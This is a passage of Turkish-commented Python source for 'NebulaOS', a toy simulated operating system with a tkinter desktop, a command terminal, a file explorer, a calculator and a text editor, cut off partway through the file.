        pygame.display.set_caption("NebulaOS Başlangıç Videosu")

        clock = pygame.time.Clock()
        running = True

        while running:
            for event in pygame.event.get():
                if event.type == pygame.QUIT:
                    running = False
                if event.type == pygame.KEYDOWN and event.key == pygame.K_ESCAPE:
                    running = False

            ret, frame = cap.read()
            if not ret:
                running = False
                continue

            frame = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
            frame_surface = pygame.surfarray.make_surface(frame.swapaxes(0, 1))

            if display_width != width or display_height != height:
                frame_surface = pygame.transform.scale(frame_surface, (display_width, display_height))

            screen.fill((0, 0, 0))
            screen.blit(frame_surface, (0, 0))
            pygame.display.flip()

            clock.tick(fps)

        cap.release()
        pygame.quit()
        print("Video oynatma tamamlandı.")
        return True

    except ImportError:
        print("Hata: Video oynatmak için 'opencv-python' ve 'pygame' kütüphaneleri kurulu değil.")
        print("Lütfen 'pip install opencv-python pygame' komutunu çalıştırarak kurun.")
        return False
    except Exception as e:
        print(f"Video oynatma sırasında bir hata oluştu: {e}")
        if pygame.get_init():
            pygame.quit()
        return False

# --- Özelleştirilmiş Giriş Kutusu (simpledialog yerine) ---
class CustomInputDialog(tk.Toplevel):
    def __init__(self, parent, title, prompt, initialvalue="", show=""):
        super().__init__(parent)
        self.transient(parent)
        self.grab_set()
        self.title(title)
        self.result = None

        parent_x = parent.winfo_x()
        parent_y = parent.winfo_y()
        parent_width = parent.winfo_width()
        parent_height = parent.winfo_height()

        self.update_idletasks()
        dialog_width = 300
        dialog_height = 150
        x = parent_x + (parent_width // 2) - (dialog_width // 2)
        y = parent_y + (parent_height // 2) - (dialog_height // 2)
        self.geometry(f"{dialog_width}x{dialog_height}+{x}+{y}")

        self.configure(bg="#1a1a2e")
        self.label = tk.Label(self, text=prompt, bg="#1a1a2e", fg="#ffffff", font=("Consolas", 10))
        self.label.pack(pady=10)

        self.entry = tk.Entry(self, show=show, bg="#000000", fg="#00ff00", insertbackground="#00ff00", font=("Consolas", 10))
        self.entry.insert(0, initialvalue)
        self.entry.pack(pady=5, padx=10, fill='x')
        self.entry.focus_set()

        self.button_frame = tk.Frame(self, bg="#1a1a2e")
        self.button_frame.pack(pady=10)

        self.ok_button = tk.Button(self.button_frame, text="Tamam", command=self._on_ok, bg="#007bff", fg="#ffffff", font=("Orbitron", 9, "bold"), relief='raised', bd=2)
        self.ok_button.pack(side='left', padx=5)

        self.cancel_button = tk.Button(self.button_frame, text="İptal", command=self._on_cancel, bg="#dc3545", fg="#ffffff", font=("Orbitron", 9, "bold"), relief='raised', bd=2)
        self.cancel_button.pack(side='right', padx=5)

        self.bind("<Return>", lambda event: self._on_ok())
        self.bind("<Escape>", lambda event: self._on_cancel())

        self.protocol("WM_DELETE_WINDOW", self._on_cancel)
        self.wait_window(self)

    def _on_ok(self):
        self.result = self.entry.get()
        self.destroy()

    def _on_cancel(self):
        self.result = None
        self.destroy()

def custom_askstring(parent, title, prompt, initialvalue="", show=""):
    dialog = CustomInputDialog(parent, title, prompt, initialvalue, show)
    return dialog.result

# --- NebulaOS Uygulama Sınıfı ---
class NebulaOSApp:
    def __init__(self, master):
        self.master = master
        master.title(f"{SYSTEM_NAME} v{OS_VERSION}")
        
        # Termux'ta tam ekran modu için X server veya VNC kurulumu gerekebilir.
        # Bu kısım, Termux X11 uygulamasıyla birlikte kullanıldığında çalışabilir.
        if sys.platform.startswith('win'):
            master.state('zoomed')
        else:
            # Android (Termux) veya Linux için tam ekran
            master.attributes('-fullscreen', True)

        master.bind("<Escape>", self.exit_fullscreen)

        self.apply_theme(system_config["theme"])

        self.command_history = []
        self.history_index = -1

        # Masaüstü Arka Planı
        self.desktop_canvas = Canvas(master, bg=system_config["desktop_background_color"], highlightthickness=0)
        self.desktop_canvas.pack(expand=True, fill='both')

        # Uygulama Simgeleri (Örnek)
        self.create_desktop_icon("Terminal", self.open_terminal, 50, 50)
        self.create_desktop_icon("Dosyalar", self.open_file_explorer, 50, 150)
        self.create_desktop_icon("Hesap Makinesi", lambda: self.nebspawn(["nebcalc.neb"]), 50, 250)
        self.create_desktop_icon("Metin Düzenleyici", lambda: self.nebspawn(["nebtext.neb"]), 50, 350)

        # Durum Çubuğu (masaüstü versiyonunda daha basit)
        self.status_bar = tk.Label(master, text=f"Durum: {SYSTEM_NAME} v{OS_VERSION} Yükleniyor...",
                                   bg=self.status_bar_bg, fg=self.status_bar_fg,
                                   font=("Consolas", 9), anchor='w')
        self.status_bar.pack(side='bottom', fill='x')

        self.initialize_nebula_fs()
        self.run_initial_setup()

        # Komut Yönlendirici (hala terminal için gerekli)
        self.commands = {
            "neblist": self.neblist,
            "nebjump": self.nebjump,
            "nebcreate": self.nebcreate,
            "nebkill": self.nebkill,
            "nebsay": self.nebsay,
            "nebtime": self.nebtime,
            "nebclear": self.nebclear,
            "nebspawn": self.nebspawn,
            "nebwho": self.nebwho,
            "nebperm": self.nebperm,
            "nebdelete": self.nebdelete,
            "nebcopy": self.nebcopy,
            "nebmove": self.nebmove,
            "nebhelp": self.nebhelp,
            "neblog": self.neblog,
            "nebconfig": self.nebconfig,
            "nebuser": self.nebuser,
            "nebpass": self.nebpass,
            "nebsmash": self.nebsmash,
            "nebview": self.nebview,
            "nebdir": self.nebdir,
            "nebstatus": self.nebstatus,
            "nebcom": self.nebcom,
            "nebinstall": self.nebinstall,
            "nebreport": self.nebreport,
            "nebscan": self.nebscan,
            "nebexec": self.nebexec,
            "nebversion": self.nebversion,
        }
        self.update_status("Hazır.")

    def apply_theme(self, theme_name):
        """Uygulamanın renk temasını ayarlar."""
        if theme_name == "dark_nebula":
            self.bg_color = "#0a0a1a"
            self.text_bg_color = "#000000"
            self.text_fg_color = "#00ff00"
            self.accent_color = "#00ffff"
            self.button_bg_color = "#007bff"
            self.button_fg_color = "#ffffff"
            self.button_active_bg_color = "#0056b3"
            self.status_bar_bg = "#1f1f3a"
            self.status_bar_fg = "#cccccc"
            system_config["desktop_background_color"] = "#1a1a2e"
        elif theme_name == "cosmic_dawn":
            self.bg_color = "#1c1c3a"
            self.text_bg_color = "#050510"
            self.text_fg_color = "#ffcc00"
            self.accent_color = "#ff66cc"
            self.button_bg_color = "#9933ff"
            self.button_fg_color = "#ffffff"
            self.button_active_bg_color = "#7a29cc"
            self.status_bar_bg = "#2a2a4a"
            self.status_bar_fg = "#e0e0e0"
            system_config["desktop_background_color"] = "#1c1c3a"
        
        self.header_font = ("Orbitron", 16, "bold")
        self.prompt_font = ("Consolas", 14, "bold")
        self.text_font = ("Consolas", 12)
        self.button_font = ("Orbitron", 10, "bold")

        self.master.configure(bg=self.bg_color)
        if hasattr(self, 'desktop_canvas'):
            self.desktop_canvas.config(bg=system_config["desktop_background_color"])
        if hasattr(self, 'status_bar'):
            self.status_bar.configure(bg=self.status_bar_bg, fg=self.status_bar_fg)

    def update_status(self, message):
        """Durum çubuğunu günceller."""
        self.status_bar.config(text=f"Durum: {message}")

    def exit_fullscreen(self, event=None):
        """Escape tuşuna basıldığında tam ekrandan çıkar."""
        if sys.platform.startswith('win'):
            self.master.state('normal')
        else:
            self.master.attributes('-fullscreen', False)
        print("\nTam ekrandan çıkıldı. Tekrar tam ekran olmak için uygulamayı yeniden başlatın veya pencereyi büyütün.")
        self.update_status("Tam ekrandan çıkıldı.")

    def create_desktop_icon(self, name, command, x, y):
        """Masaüstünde bir uygulama simgesi oluşturur."""
        icon_frame = Frame(self.desktop_canvas, bg=system_config["desktop_background_color"])
        icon_frame.place(x=x, y=y)

        # Basit bir simge olarak bir Label kullanabiliriz
        # Gerçek uygulamada buraya bir resim (PhotoImage) eklenebilir.
        icon_label = Label(icon_frame, text="🌌", font=("Segoe UI Emoji", 24), bg=system_config["desktop_background_color"], fg="white")
        icon_label.pack()

        text_label = Label(icon_frame, text=name, font=("Segoe UI", 10), bg=system_config["desktop_background_color"], fg="white")
        text_label.pack()

        # Komutu çalıştırmak için tıklama olayı
        icon_frame.bind("<Button-1>", lambda e: command())
        icon_label.bind("<Button-1>", lambda e: command())
        text_label.bind("<Button-1>", lambda e: command())

    def open_terminal(self):
        """Terminal penceresini açar."""
        terminal_window = Toplevel(self.master)
        terminal_window.title(f"NebulaOS Terminal - {current_user}")
        terminal_window.geometry("800x600")
        terminal_window.configure(bg=self.bg_color)

        # Terminal çıktısı için ScrolledText
        terminal_output = scrolledtext.ScrolledText(terminal_window, wrap='word',
                                                     bg=self.text_bg_color,
                                                     fg=self.text_fg_color,
                                                     font=self.text_font,
                                                     insertbackground=self.text_fg_color,
                                                     relief='flat', bd=0,
                                                     highlightthickness=2,
                                                     highlightbackground=self.accent_color,
                                                     padx=15, pady=15)
        terminal_output.pack(expand=True, fill='both', padx=10, pady=10)

        # Stdout'u bu terminal penceresine yönlendir
        sys.stdout = TextRedirector(terminal_output, original_stdout)
        print(f"NebulaOS Terminali başlatıldı. Hoş geldiniz, {current_user.capitalize()}!")
        print(f"Mevcut yörünge: {current_directory}")

        # Giriş Çerçevesi
        input_frame = tk.Frame(terminal_window, bg=self.bg_color)
        input_frame.pack(side='bottom', fill='x', padx=10, pady=5)

        prompt_label = tk.Label(input_frame, text=f"🪐 NebulaOS::{current_user} >> ",
                                     bg=self.bg_color, fg=self.accent_color,
                                     font=self.prompt_font)
        prompt_label.pack(side='left', padx=(0, 10))

        command_entry = tk.Entry(input_frame,
                                      bg=self.text_bg_color,
                                      fg=self.text_fg_color,
                                      insertbackground=self.text_fg_color,
                                      font=self.text_font,
                                      relief='flat', bd=0,
                                      highlightthickness=1,
                                      highlightbackground=self.accent_color)
        command_entry.pack(side='left', expand=True, fill='x')
        
        # Terminal penceresine özel komut işleyici
        def process_terminal_command(event=None):
            command_line = command_entry.get().strip()
            command_entry.delete(0, tk.END)

            if not command_line:
                return

            # Komut geçmişine ekle
            if command_line not in self.command_history:
                self.command_history.append(command_line)
            self.history_index = -1

            print(f"{prompt_label.cget('text')}{command_line}")
            self.update_status(f"Komut yürütülüyor: {command_line[:30]}...")

            parts = command_line.split(' ', 1)
            command = parts[0].lower()
            args = parts[1].split() if len(parts) > 1 else []

            if command in self.commands:
                try:
                    self.commands[command](args)
                    self.add_log(f"Komut yürütüldü: {command_line} tarafından {current_user}")
                    self.update_status(f"Komut tamamlandı: {command}")
                except Exception as e:
                    messagebox.showerror("Komut Hatası", f"Komut yürütme hatası: {e}")
                    print(f"Komut yürütme hatası: {e}")
                    self.add_log(f"Komut yürütme hatası '{command_line}': {e}")
                    self.update_status(f"Hata: {command}")
            else:
                messagebox.showwarning("Bilinmeyen Komut", f"'{command}' adında bir Nebula komutu bulunamadı. 'nebhelp' yazarak yardım alabilirsiniz.")
                print(f"Hata: '{command}' adında bir Nebula komutu bulunamadı. 'nebhelp' yazarak yardım alabilirsiniz.")
                self.add_log(f"Bilinmeyen komut: {command_line} tarafından {current_user}")
                self.update_status(f"Bilinmeyen komut: {command}")

        command_entry.bind("<Return>", process_terminal_command)
        command_entry.bind("<Up>", self.history_up)
        command_entry.bind("<Down>", self.history_down)

        submit_button = tk.Button(input_frame, text="Gönder", command=process_terminal_command,
                                       bg=self.button_bg_color, fg=self.button_fg_color,
                                       font=self.button_font,
                                       relief='raised', bd=2,
                                       activebackground=self.button_active_bg_color, activeforeground=self.button_fg_color,
                                       padx=10, pady=5)
        submit_button.pack(side='right', padx=(10, 0))

        # Pencere kapatıldığında stdout'u sıfırla
        terminal_window.protocol("WM_DELETE_WINDOW", lambda: self._close_terminal_window(terminal_window))
        self.update_status("Terminal açıldı.")

    def _close_terminal_window(self, window):
        """Terminal penceresi kapatıldığında stdout'u orijinaline döndürür."""
        sys.stdout = original_stdout
        window.destroy()
        self.update_status("Terminal kapatıldı.")

    def open_file_explorer(self):
        """Basit bir dosya gezgini penceresi açar."""
        file_explorer_window = Toplevel(self.master)
        file_explorer_window.title(f"NebulaOS Dosya Gezgini - {current_user}")
        file_explorer_window.geometry("700x500")
        file_explorer_window.configure(bg=self.bg_color)

        # Mevcut dizini gösteren etiket
        current_dir_label = Label(file_explorer_window, text=f"Mevcut Yörünge: {current_directory}", bg=self.bg_color, fg="white", font=("Consolas", 12))
        current_dir_label.pack(pady=5, fill='x')

        # Dosya ve klasörleri listeleyen çerçeve
        file_list_frame = Frame(file_explorer_window, bg=self.text_bg_color)
        file_list_frame.pack(expand=True, fill='both', padx=10, pady=5)

        file_list_text = scrolledtext.ScrolledText(file_list_frame, wrap='word',
                                                     bg=self.text_bg_color,
                                                     fg=self.text_fg_color,
                                                     font=self.text_font,
                                                     insertbackground=self.text_fg_color,
                                                     relief='flat', bd=0,
                                                     highlightthickness=1,
                                                     highlightbackground=self.accent_color,
                                                     padx=10, pady=10)
        file_list_text.pack(expand=True, fill='both')

        def refresh_file_list():
            file_list_text.delete(1.0, tk.END)
            full_path = self.get_full_nebula_path(current_directory)
            try:
                items = os.listdir(full_path)
                file_list_text.insert(tk.END, f"Yörünge: {current_directory}\n")
                file_list_text.insert(tk.END, "--------------------\n")
                if ".." not in items and current_directory != "/":
                    file_list_text.insert(tk.END, "  [Yörünge] ../\n") # Üst dizine git
                if not items:
                    file_list_text.insert(tk.END, "Bu yörüngede hiçbir parçacık yok.\n")
                for item in items:
                    item_full_path = os.path.join(full_path, item)
                    if os.path.isdir(item_full_path):
                        file_list_text.insert(tk.END, f"  [Yörünge] {item}/\n")
                    else:
                        file_list_text.insert(tk.END, f"  [Parçacık] {item}\n")
            except Exception as e:
                file_list_text.insert(tk.END, f"Hata oluştu: {e}\n")
            file_list_text.see(tk.END)
            current_dir_label.config(text=f"Mevcut Yörünge: {current_directory}")

        # Basit bir "Yukarı Git" düğmesi
        up_button = Button(file_explorer_window, text="Yukarı Git", command=lambda: self.nebjump([".."]) or refresh_file_list(),
                           bg=self.button_bg_color, fg=self.button_fg_color, font=self.button_font)
        up_button.pack(pady=5)

        refresh_file_list()
        self.update_status("Dosya gezgini açıldı.")

    # --- Yardımcı Fonksiyonlar (GUI ve Konsola Uyarlandı) ---
    def clear_screen(self):
        """Terminal ekranını (GUI metin widget'ı ve orijinal konsol) temizler."""
        # Eğer bir terminal penceresi açıksa, onun çıktısını temizle
        if sys.stdout != original_stdout and hasattr(sys.stdout, 'widget'):
            sys.stdout.widget.delete(1.0, tk.END)
        original_stdout.write("\n" * 50)
        original_stdout.flush()

    def get_full_nebula_path(self, nebula_path):
        """
        Bir NebulaOS yolunu tam ana bilgisayar OS yoluna dönüştürür.
        Göreceli yolları işler.
        """
        if nebula_path.startswith('/'):
            return os.path.join(NEBULA_ROOT, nebula_path.lstrip('/'))
        else:
            full_current_path = os.path.join(NEBULA_ROOT, current_directory.lstrip('/'))
            return os.path.join(full_current_path, nebula_path)

    def get_nebula_path_from_host_path(self, host_path):
        """
        Tam bir ana bilgisayar OS yolunu bir NebulaOS yoluna geri dönüştürür.
        """
        if host_path.startswith(NEBULA_ROOT):
            return '/' + os.path.relpath(host_path, NEBULA_ROOT).replace(os.sep, '/')
        return host_path

    def check_permission(self, user, path, required_permission):
        """
        Geçerli kullanıcının belirli bir yol için gerekli izne sahip olup olmadığını kontrol eder.
        Bu, kullanıcı rollerine dayalı basitleştirilmiş bir kontroldür.
        """
        if user == "root":
            return True

        if required_permission == "r":
            return True
        elif required_permission == "w":
            user_cosmic_path = f"/cosmic/{user}"
            return path.startswith(user_cosmic_path) or path.startswith("/void")
        elif required_permission == "x":
            return path.startswith("/galaxy") or path.startswith(f"/cosmic/{user}")
        return False

    # --- NebulaOS Komut Uygulamaları (GUI ve Konsola Uyarlandı) ---
    # Bu komutlar, terminal penceresi açıkken kullanılabilir.
    # nebkill, nebsmash, nebexec gibi komutlar messagebox kullanmaya devam edecektir.

    def neblist(self, args):
        """
        neblist: Mevcut "yörüngedeki" (dizindeki) tüm "parçacıkları" (dosya/klasörleri) listeler.
        Kullanım: neblist [yörünge_adı]
        """
        target_path = current_directory
        if args:
            target_path = args[0]

        full_path = self.get_full_nebula_path(target_path)

        if not os.path.exists(full_path):
            print(f"Hata: '{target_path}' yörüngesi bulunamadı.")
            return

        if not self.check_permission(current_user, target_path, "r"):
            print(f"Erişim Reddedildi: '{target_path}' yörüngesini listeleme yetkiniz yok.")
            return

        print(f"Yörünce: {target_path}")
        print("--------------------")
        try:
            items = os.listdir(full_path)
            if not items:
                print("Bu yörüngede hiçbir parçacık yok.")
            for item in items:
                item_full_path = os.path.join(full_path, item)
                if os.path.isdir(item_full_path):
                    print(f"  [Yörünge] {item}/")
                else:
                    print(f"  [Parçacık] {item}")
        except Exception as e:
            print(f"Hata oluştu: {e}")

    def nebjump(self, args):
        """
        nebjump: Belirtilen "yörüngeye" (dizine) geçiş yapar.
        Kullanım: nebjump <yörünge_adı>
        """
        global current_directory
        if not args:
            print("Kullanım: nebjump <yörünge_adı>")
            return

        target_path = args[0]
        
        if target_path == '..':
            if current_directory == '/':
                print("Zaten en üst yörüngedesiniz.")
                return
            current_directory = os.path.dirname(current_directory)
            if current_directory == '\\': # Windows uyumluluğu
                current_directory = '/'
            print(f"Yeni yörünge: {current_directory}")
            # Masaüstü ortamında prompt güncellemesi terminale özeldir.
            # self.update_prompt() # Bu çağrı terminal penceresine taşınmalı
            return

        new_full_path = self.get_full_nebula_path(target_path)
        normalized_nebula_path = os.path.normpath(os.path.join(current_directory, target_path)).replace(os.sep, '/')
        if not normalized_nebula_path.startswith('/'):
            normalized_nebula_path = '/' + normalized_nebula_path

        if not os.path.isdir(new_full_path):
            print(f"Hata: '{target_path}' geçerli bir yörünge değil veya bulunamadı.")
            return

        if not self.check_permission(current_user, normalized_nebula_path, "r"):
            print(f"Erişim Reddedildi: '{target_path}' yörüngesine geçiş yetkiniz yok.")
            return

        current_directory = normalized_nebula_path
        print(f"Yeni yörünge: {current_directory}")
        # self.update_prompt() # Bu çağrı terminal penceresine taşınmalı
        self.update_status(f"Yörüngeye atlandı: {current_directory}")

    def nebcreate(self, args):
        """
        nebcreate: Belirtilen "parçacığı" (dosyayı) oluşturur. İçine başlangıç verisi yazılabilir.
        Kullanım: nebcreate <parçacık_adı> [içerik]
        """
        if not args:
            print("Kullanım: nebcreate <parçacık_adı> [içerik]")
            return

        file_name = args[0]
        content = " ".join(args[1:]) if len(args) > 1 else ""

        full_path = self.get_full_nebula_path(file_name)
        nebula_path = self.get_nebula_path_from_host_path(full_path)

        if not self.check_permission(current_user, nebula_path, "w"):
            print(f"Erişim Reddedildi: '{file_name}' parçacığını oluşturma yetkiniz yok.")
            return

        try:
            with open(full_path, 'w') as f:
                f.write(content)
            print(f"'{file_name}' parçacığı oluşturuldu.")
            self.update_status(f"Parçacık oluşturuldu: {file_name}")
        except Exception as e:
            print(f"Hata oluştu: {e}")

    def nebkill(self, args):
        """
        nebkill: Sistemi güvenli bir şekilde "durdurur" (kapatır). Root yetkisi gerektirir.
        Kullanım: nebkill
        """
        if current_user != "root":
            print("Erişim Reddedildi: Sistemi durdurmak için root yetkisi gereklidir.")
            return

        if messagebox.askyesno("NebulaOS Kapatma", "NebulaOS'u kapatmak istediğinizden emin misiniz?"):
            print("NebulaOS durduruluyor... İyi yolculuklar.")
            self.update_status("Sistem kapatılıyor...")
            self.master.after(1000, self.master.destroy)
        else:
            print("Kapatma iptal edildi.")
            self.update_status("Kapatma iptal edildi.")

    def nebsay(self, args):
        """
        nebsay: Ekrana belirtilen "mesajı" (metni) basar.
        Kullanım: nebsay <mesaj>
        """
        if not args:
            print("Kullanım: nebsay <mesaj>")
            return
        print(" ".join(args))
        self.update_status("Mesaj basıldı.")

    def nebtime(self, args):
        """
        nebtime: Sistem "zaman akışını" (saatini ve tarihini) gösterir.
        Kullanım: nebtime
        """
        now = datetime.datetime.now()
        print(f"Sistem Zaman Akışı: {now.strftime('%Y-%m-%d %H:%M:%S')}")
        self.update_status("Zaman akışı görüntülendi.")

    def nebclear(self, args):
        """
        nebclear: Terminal ekranını "kozmik tozlardan" (ekrandaki metinlerden) temizler.
        Kullanım: nebclear
        """
        self.clear_screen()
        self.update_status("Ekran temizlendi.")

    def nebspawn(self, args):
        """
        nebspawn: Yeni bir "yıldız gemisi" (işlem) başlatır. Belirtilen programı çalıştırır.
        Bu bir simülasyondur, gerçek bir işlem başlatmaz.
        Kullanım: nebspawn <program_adı> [argümanlar]
        """
        if not args:
            print("Kullanım: nebspawn <program_adı> [argümanlar]")
            return
        
        program_name = args[0]
        full_path = self.get_full_nebula_path(program_name)
        nebula_path = self.get_nebula_path_from_host_path(full_path)

        if not os.path.exists(full_path):
            print(f"Hata: '{program_name}' yıldız gemisi (programı) bulunamadı.")
            return
        
        if not os.path.isfile(full_path):
            print(f"Hata: '{program_name}' bir parçacık (dosya) değil.")
            return

        if not self.check_permission(current_user, nebula_path, "x"):
            print(f"Erişim Reddedildi: '{program_name}' yıldız gemisini başlatma yetkiniz yok.")
            return

        # Program adına göre yürütmeyi simüle et
        if program_name == "nebcalc.neb":
            self.open_calculator_app()
        elif program_name == "nebtext.neb":
            self.open_text_editor_app()
        elif program_name == "nebgame.neb":
            print("NebGame yıldız gemisi başlatılıyor... (Konsol tabanlı oyun)")
            print("Uzay geminiz hazır! Düşmanlarla savaşın!")
            print("...")
            print("Oyun bitti. Kazandınız!") if randint(0,1) else print("Oyun bitti. Kaybettiniz.")
            print("NebGame yıldız gemisi durduruldu.")
        else:
            print(f"'{program_name}' yıldız gemisi başlatılıyor... (Simülasyon)")
            print(f"Argümanlar: {args[1:]}")
        self.update_status(f"Program başlatıldı: {program_name}")

    def open_calculator_app(self):
        """Hesap Makinesi uygulamasını açar."""
        calc_window = Toplevel(self.master)
        calc_window.title("NebulaOS Hesap Makinesi")
        calc_window.geometry("300x400")
        calc_window.configure(bg=self.bg_color)

        entry = tk.Entry(calc_window, width=20, font=("Arial", 24), bd=5, relief=tk.GROOVE, justify=tk.RIGHT)
        entry.grid(row=0, column=0, columnspan=4, padx=5, pady=5)

        buttons = [
            '7', '8', '9', '/',
            '4', '5', '6', '*',
            '1', '2', '3', '-',
            '0', '.', '=', '+'
        ]

        row_val = 1
        col_val = 0
        for button_text in buttons:
            if button_text == '=':
                Button(calc_window, text=button_text, width=5, height=2, font=("Arial", 18),
                       command=lambda btn=button_text: self._calculate(entry)).grid(row=row_val, column=col_val, padx=2, pady=2)
            else:
                Button(calc_window, text=button_text, width=5, height=2, font=("Arial", 18),
                       command=lambda btn=button_text: entry.insert(tk.END, btn)).grid(row=row_val, column=col_val, padx=2, pady=2)
            col_val += 1
            if col_val > 3:
                col_val = 0
                row_val += 1
        
        Button(calc_window, text="C", width=5, height=2, font=("Arial", 18),
               command=lambda: entry.delete(0, tk.END)).grid(row=row_val, column=col_val, padx=2, pady=2)
        
        self.update_status("Hesap Makinesi açıldı.")

    def _calculate(self, entry_widget):
        """Hesap makinesi işlemini gerçekleştirir."""
        try:
            result = eval(entry_widget.get())
            entry_widget.delete(0, tk.END)
            entry_widget.insert(0, str(result))
        except Exception as e:
            entry_widget.delete(0, tk.END)
            entry_widget.insert(0, "Hata")
            messagebox.showerror("Hesap Makinesi Hatası", f"Geçersiz ifade: {e}")
        self.update_status("Hesaplama yapıldı.")

    def open_text_editor_app(self):
        """Metin Düzenleyici uygulamasını açar."""
        text_editor_window = Toplevel(self.master)
        text_editor_window.title("NebulaOS Metin Düzenleyici")
        text_editor_window.geometry("800x600")
        text_editor_window.configure(bg=self.bg_color)

        file_path_var = tk.StringVar(value="") # Açık dosyanın yolunu tutar

        file_entry = tk.Entry(text_editor_window, textvariable=file_path_var, bg=self.text_bg_color, fg=self.text_fg_color,
                              font=self.text_font, relief='flat', bd=0, highlightthickness=1, highlightbackground=self.accent_color)
        file_entry.pack(fill='x', padx=10, pady=(10, 0))

        text_area = scrolledtext.ScrolledText(text_editor_window, wrap='word',
                                              bg=self.text_bg_color,
                                              fg=self.text_fg_color,
                                              font=self.text_font,
                                              insertbackground=self.text_fg_color,
                                              relief='flat', bd=0,
                                              highlightthickness=2,
                                              highlightbackground=self.accent_color,
                                              padx=15, pady=15)
        text_area.pack(expand=True, fill='both', padx=10, pady=10)

        def open_file():
            nebula_file_path = custom_askstring(text_editor_window, "Dosya Aç", "Açılacak parçacık adını girin:")
            if not nebula_file_path:
                return

            full_path = self.get_full_nebula_path(nebula_file_path)
            if not os.path.exists(full_path):
                messagebox.showerror("Dosya Hatası", f"Hata: '{nebula_file_path}' parçacığı bulunamadı.")
                return
            if os.path.isdir(full_path):
                messagebox.showerror("Dosya Hatası", f"Hata: '{nebula_file_path}' bir yörünge (dizin), parçacık değil.")
                return

            if not self.check_permission(current_user, nebula_file_path, "r"):
                messagebox.showerror("Erişim Reddedildi", f"'{nebula_file_path}' parçacığını okuma yetkiniz yok.")
                return

            try:
                with open(full_path, 'r') as f:
                    content = f.read()
                text_area.delete(1.0, tk.END)
                text_area.insert(1.0, content)
                file_path_var.set(nebula_file_path)
                self.update_status(f"Dosya açıldı: {nebula_file_path}")
            except Exception as e:
                messagebox.showerror("Dosya Açma Hatası", f"Dosya açılırken hata oluştu: {e}")

        def save_file():
            nebula_file_path = file_path_var.get()
            if not nebula_file_path:
                nebula_file_path = custom_askstring(text_editor_window, "Dosya Kaydet", "Kaydedilecek parçacık adını girin:")
                if not nebula_file_path:
                    return

            full_path = self.get_full_nebula_path(nebula_file_path)
            
            if not self.check_permission(current_user, nebula_file_path, "w"):
                messagebox.showerror("Erişim Reddedildi", f"'{nebula_file_path}' parçacığına yazma yetkiniz yok.")
                return

            try:
                with open(full_path, 'w') as f:
                    f.write(text_area.get(1.0, tk.END))
                file_path_var.set(nebula_file_path)
                messagebox.showinfo("Kaydetme Başarılı", f"'{nebula_file_path}' parçacığı başarıyla kaydedildi.")
                self.update_status(f"Dosya kaydedildi: {nebula_file_path}")
            except Exception as e:
                messagebox.showerror("Dosya Kaydetme Hatası", f"Dosya kaydedilirken hata oluştu: {e}")

        button_frame = Frame(text_editor_window, bg=self.bg_color)
        button_frame.pack(fill='x', padx=10, pady=5)

        open_button = Button(button_frame, text="Aç", command=open_file,
                             bg=self.button_bg_color, fg=self.button_fg_color, font=self.button_font)
        open_button.pack(side='left', padx=5)

        save_button = Button(button_frame, text="Kaydet", command=save_file,
                             bg=self.button_bg_color, fg=self.button_fg_color, font=self.button_font)
        save_button.pack(side='left', padx=5)

        self.update_status("Metin Düzenleyici açıldı.")

    def nebwho(self, args):
        """
        nebwho: Aktif "gezginleri" (kullanıcıları) listeler.
        Kullanım: nebwho
        """
        print("Aktif Gezginler:")
        print(f"  - {current_user} (Şu anki)")
        self.update_status("Aktif gezginler listelendi.")

    def nebperm(self, args):
        """
        nebperm: Belirtilen "parçacığın" (dosya/klasörün) "enerji kalkanlarını" (izinlerini) gösterir.
        Bu bir simülasyondur, gerçek dosya izinlerini göstermez.
        Kullanım: nebperm <parçacık_adı>
        """
        if not args:
            print("Kullanım: nebperm <parçacık_adı>")
            return
        
        target_name = args[0]
        full_path = self.get_full_nebula_path(target_name)
        nebula_path = self.get_nebula_path_from_host_path(full_path)

        if not os.path.exists(full_path):
            print(f"Hata: '{target_name}' parçacığı/yörüngesi bulunamadı.")
            return

        print(f"'{target_name}' için Enerji Kalkanları:")
        print(f"  Root: Okuma (r), Yazma (w), Çalıştırma (x)")
        print(f"  Normal Kullanıcılar:")
        
        can_read = self.check_permission("gezgin", nebula_path, "r")
        can_write = self.check_permission("gezgin", nebula_path, "w")
        can_execute = self.check_permission("gezgin", nebula_path, "x")

        perms_str = []
        if can_read: perms_str.append("Okuma (r)")
        if can_write: perms_str.append("Yazma (w)")
        if can_execute: perms_str.append("Çalıştırma (x)")

        if perms_str:
            print(f"    {' '.join(perms_str)}")
        else:
            print("    Hiçbir özel yetki.")
        self.update_status(f"İzinler görüntülendi: {target_name}")

    def nebdelete(self, args):
        """
        nebdelete: Belirtilen "parçacığı" (dosya/klasörü) "yok eder" (siler).
        Kullanım: nebdelete <parçacık_adı>
        """
        if not args:
            print("Kullanım: nebdelete <parçacık_adı>")
            return

        target_name = args[0]
        full_path = self.get_full_nebula_path(target_name)
        nebula_path = self.get_nebula_path_from_host_path(full_path)

        if not os.path.exists(full_path):
            print(f"Hata: '{target_name}' parçacığı/yörüngesi bulunamadı.")
            return
        
        if not self.check_permission(current_user, nebula_path, "w"):
            print(f"Erişim Reddedildi: '{target_name}' parçacığını/yörüngesini silme yetkiniz yok.")
            return

        if not messagebox.askyesno("Silme Onayı", f"'{target_name}' öğesini silmek istediğinizden emin misiniz?"):
            print("Silme işlemi iptal edildi.")
            self.update_status("Silme iptal edildi.")
            return

        try:
            if os.path.isdir(full_path):
                shutil.rmtree(full_path)
                print(f"'{target_name}' yörüngesi yok edildi.")
            else:
                os.remove(full_path)
                print(f"'{target_name}' parçacığı yok edildi.")
            self.update_status(f"Öğe silindi: {target_name}")
        except Exception as e:
            print(f"Yok etme hatası: {e}")

    def nebcopy(self, args):
        """
        nebcopy: Bir "parçacığı" (dosyayı) bir "yörüngeden" (dizinden) diğerine "kopyalar".
        Kullanım: nebcopy <kaynak_parçacık> <hedef_yörünge_veya_parçacık_adı>
        """
        if len(args) != 2:
            print("Kullanım: nebcopy <kaynak_parçacık> <hedef_yörünge_veya_parçacık_adı>")
            return

        source_nebula_path = args[0]
        destination_nebula_path = args[1]

        full_source_path = self.get_full_nebula_path(source_nebula_path)
        full_destination_path = self.get_full_nebula_path(destination_nebula_path)

        if not os.path.exists(full_source_path):
            print(f"Hata: Kaynak parçacık/yörünge '{source_nebula_path}' bulunamadı.")
            return
        
        if not os.path.isfile(full_source_path):
            print(f"Hata: '{source_nebula_path}' bir parçacık (dosya) değil, kopyalama işlemi sadece parçacıklar için geçerlidir.")
            return

        if not self.check_permission(current_user, source_nebula_path, "r"):
